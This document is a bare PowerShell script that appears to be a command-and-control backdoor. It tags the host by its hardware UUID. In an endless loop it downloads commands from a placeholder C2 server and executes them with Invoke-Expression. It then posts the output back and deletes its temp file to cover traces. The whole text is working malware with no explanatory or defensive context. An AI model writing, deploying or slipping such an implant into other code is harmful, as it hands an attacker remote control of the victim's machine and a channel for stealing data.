$tmp = [System.Environment]::GetEnvironmentVariable('temp');
$my = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID;
while(1) {
 Invoke-WebRequest {$C2}?q=$my | iex > $tmp\pipe.bin;
 $bodyobj = @{chcmd = Get-Content -Path $tmp\pipe.bin | Out-String};
 Invoke-WebRequest {$C2}?q=$my -Method Post -Body $bodyobj;
 Remove-Item $tmp\pipe.bin;
 Start-Sleep 5;	
};